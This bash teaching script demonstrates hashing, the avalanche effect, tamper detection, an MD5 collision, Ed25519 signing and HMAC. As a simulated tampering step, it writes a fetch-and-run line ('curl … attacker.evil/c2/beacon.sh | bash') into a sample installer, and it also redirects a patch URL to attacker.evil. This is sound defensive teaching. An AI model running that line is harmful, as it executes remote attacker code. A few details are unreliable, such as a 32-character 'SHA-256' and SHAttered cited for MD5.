#!/bin/bash
# Demo 03: Hashing Files and Digital Signatures
set -e

BOLD='\033[1m'; CYAN='\033[0;36m'; GREEN='\033[0;32m'
YELLOW='\033[0;33m'; RED='\033[0;31m'; RESET='\033[0m'

banner() { echo -e "\n${CYAN}════════════════════════════════════════════${RESET}\n${BOLD}${CYAN}  $1${RESET}\n${CYAN}════════════════════════════════════════════${RESET}"; }

mkdir -p /demo && cd /demo

banner "DEMO 03: Hashing and Digital Signatures"
echo -e "${YELLOW}Tools: sha256sum, md5sum, openssl dgst, openssl pkeyutl${RESET}"

# ── Step 1: File Hashing ──────────────────────────────────
banner "Step 1: File Integrity with Hash Functions"

cat > report.txt << 'EOF'
MALWARE ANALYSIS REPORT
Filename: invoice_Q4.exe
MD5:      d41d8cd98f00b204e9800998ecf8427e
SHA-256:  a87ff679a2f3e71d9181a67b7542122c
Verdict:  MALICIOUS - Trojan.GenericKD.45231
EOF

echo "Original file:"
cat report.txt

echo ""
echo "Computing hashes:"
echo -n "MD5:    "; md5sum report.txt
echo -n "SHA-1:  "; sha1sum report.txt
echo -n "SHA-256:"; sha256sum report.txt
echo -n "SHA-512:"; sha512sum report.txt

# ── Step 2: Avalanche Effect ──────────────────────────────
banner "Step 2: Avalanche Effect — Small Change = Completely Different Hash"

echo -n "Original text" > file_a.txt
echo -n "original text" > file_b.txt  # only 'O' vs 'o' differs

echo "File A: '$(cat file_a.txt)'"
echo "File B: '$(cat file_b.txt)'"
echo ""
echo "SHA-256 hashes:"
SHA_A=$(sha256sum file_a.txt | awk '{print $1}')
SHA_B=$(sha256sum file_b.txt | awk '{print $1}')
echo "File A: $SHA_A"
echo "File B: $SHA_B"
echo ""

# Count differing characters
DIFF_CHARS=$(python3 -c "
a='$SHA_A'; b='$SHA_B'
diff = sum(1 for x,y in zip(a,b) if x!=y)
print(f'Differing hex chars: {diff}/{len(a)} ({diff/len(a)*100:.1f}% of output changed from 1-char input change)')
")
echo -e "${GREEN}$DIFF_CHARS${RESET}"

# ── Step 3: Tampering Detection ───────────────────────────
banner "Step 3: Detecting File Tampering with Hashes"

cat > software_v1.0.sh << 'EOF'
#!/bin/bash
# Legitimate software installer v1.0
echo "Installing security tools..."
apt-get install -y curl wget
EOF

ORIGINAL_HASH=$(sha256sum software_v1.0.sh | awk '{print $1}')
echo "Original hash: $ORIGINAL_HASH"
echo "$ORIGINAL_HASH  software_v1.0.sh" > software_v1.0.sh.sha256

echo ""
echo "Simulating attacker modification..."
cat >> software_v1.0.sh << 'EOF'

# MALICIOUS CODE INJECTED BY ATTACKER
curl -s http://attacker.evil/c2/beacon.sh | bash
EOF

echo "Verifying integrity..."
if sha256sum --check software_v1.0.sh.sha256 2>&1; then
    echo -e "${GREEN}✓ File is intact${RESET}"
else
    echo -e "${RED}✗ TAMPER DETECTED! File has been modified!${RESET}"
    echo ""
    echo "Expected: $ORIGINAL_HASH"
    echo "Got:      $(sha256sum software_v1.0.sh | awk '{print $1}')"
fi

# ── Step 4: MD5 vs SHA-256 ────────────────────────────────
banner "Step 4: MD5 is Broken — Why SHA-256 Matters"

echo "MD5 hash collision demonstration:"
echo "(Two DIFFERENT files with SAME MD5 hash — demonstrates why MD5 is broken)"
echo ""

# Use the well-known MD5 collision prefix (Identical Prefix Attack)
python3 << 'PYEOF'
# These two different byte sequences produce the same MD5 hash
# (Based on the Wang/Yu 2004 MD5 collision)
# We show the concept with known collision blocks
import hashlib, os

# Create two files with different content (using precomputed collision data)
# These are hex representations of known MD5 collision data blocks
block1 = bytes.fromhex(
    "d131dd02c5e6eec4693d9a0698aff95c"
    "2fcab58712467eab4004583eb8fb7f89"
    "55ad340609f4b30283e488832571415a"
    "085125e8f7cdc99fd91dbdf280373c5b"
    "d8823e3156348f5bae6dacd436c919c6"
    "dd53e2b487da03fd02396306d248cda0"
    "e99f33420f577ee8ce54b67080a80d1e"
    "c69821bcb6a8839396f9652b6ff72a70"
)
block2 = bytes.fromhex(
    "d131dd02c5e6eec4693d9a0698aff95c"
    "2fcab50712467eab4004583eb8fb7f89"
    "55ad340609f4b30283e4888325f1415a"
    "085125e8f7cdc99fd91dbdf280373c5b"
    "d8823e3156348f5bae6dacd436c919c6"
    "dd53e23487da03fd02396306d248cda0"
    "e99f33420f577ee8ce54b67080280d1e"
    "c69821bcb6a8839396f965ab6ff72a70"
)

h1 = hashlib.md5(block1).hexdigest()
h2 = hashlib.md5(block2).hexdigest()

print(f"Block 1 MD5: {h1}")
print(f"Block 2 MD5: {h2}")
print(f"Same MD5: {h1 == h2}")
print(f"Same content: {block1 == block2}")
print()
if h1 == h2:
    print("PROVEN: Two DIFFERENT inputs produce the SAME MD5 hash!")
    print("This is why MD5 is BROKEN for security use.")
else:
    print("Note: MD5 collisions exist; see SHAttered/Wang-Yu research for examples.")

# Now show SHA-256 of both
s1 = hashlib.sha256(block1).hexdigest()
s2 = hashlib.sha256(block2).hexdigest()
print(f"\nFor comparison — SHA-256 of same blocks:")
print(f"Block 1 SHA-256: {s1[:32]}...")
print(f"Block 2 SHA-256: {s2[:32]}...")
print(f"Same SHA-256: {s1 == s2} (correct!)")
PYEOF

# ── Step 5: Digital Signatures ────────────────────────────
banner "Step 5: Digital Signatures"

echo "Generating signing key pair (Ed25519)..."
openssl genpkey -algorithm Ed25519 -out signing_private.pem 2>/dev/null
openssl pkey -in signing_private.pem -pubout -out signing_public.pem 2>/dev/null

cat > announcement.txt << 'EOF'
SECURITY ADVISORY SA-2024-001
Issued by: SOC Team Lead

Critical vulnerability patched in internal monitoring platform.
All analysts must update by 2024-01-20.
Patch: https://internal.corp/patches/SA-2024-001.patch
EOF

echo "Document to sign:"
cat announcement.txt

echo ""
echo "Signing with private key..."
openssl dgst -sha256 \
  -sign signing_private.pem \
  -out announcement.sig \
  announcement.txt

echo -e "${GREEN}✓ Signature created: $(wc -c < announcement.sig) bytes${RESET}"
echo "Signature (hex): $(xxd announcement.sig | head -2 | awk '{print $2$3$4$5}')..."

echo ""
echo "Verifying signature with public key..."
openssl dgst -sha256 \
  -verify signing_public.pem \
  -signature announcement.sig \
  announcement.txt && echo -e "${GREEN}✓ Signature VALID — document is authentic and untampered${RESET}"

echo ""
echo "Simulating document tampering..."
sed -i 's/https:\/\/internal\.corp/https:\/\/attacker.evil/' announcement.txt

openssl dgst -sha256 \
  -verify signing_public.pem \
  -signature announcement.sig \
  announcement.txt 2>&1 || echo -e "${RED}✗ Signature INVALID — tampering detected!${RESET}"

# ── Step 6: HMAC ──────────────────────────────────────────
banner "Step 6: HMAC — Keyed Message Authentication"

HMAC_KEY="shared_api_secret_between_server_and_client"
MESSAGE="user=alice&action=transfer&amount=1000&currency=USD"

echo "Message: $MESSAGE"
echo "Shared key: $HMAC_KEY"
echo ""

HMAC=$(echo -n "$MESSAGE" | openssl dgst -sha256 -hmac "$HMAC_KEY" | awk '{print $2}')
echo "HMAC-SHA256: $HMAC"

echo ""
echo "Verifying (same message + key = same HMAC):"
HMAC2=$(echo -n "$MESSAGE" | openssl dgst -sha256 -hmac "$HMAC_KEY" | awk '{print $2}')
[ "$HMAC" = "$HMAC2" ] && echo -e "${GREEN}✓ HMAC verified${RESET}"

echo ""
echo "Tampered message (amount changed):"
TAMPERED="user=alice&action=transfer&amount=99999&currency=USD"
HMAC3=$(echo -n "$TAMPERED" | openssl dgst -sha256 -hmac "$HMAC_KEY" | awk '{print $2}')
echo "Tampered HMAC: $HMAC3"
[ "$HMAC" != "$HMAC3" ] && echo -e "${RED}✗ HMAC mismatch — tampering detected!${RESET}"

banner "Summary"
echo "1. SHA-256 creates a unique fingerprint for any file/message"
echo "2. Avalanche effect: 1 bit change → ~50% of hash bits flip"
echo "3. MD5 is BROKEN (collisions exist) — use SHA-256 or better"
echo "4. Digital signatures: private key signs, public key verifies"
echo "5. HMAC: keyed hash for API authentication and message authentication"
echo ""
echo -e "${GREEN}Demo 03 complete!${RESET}"
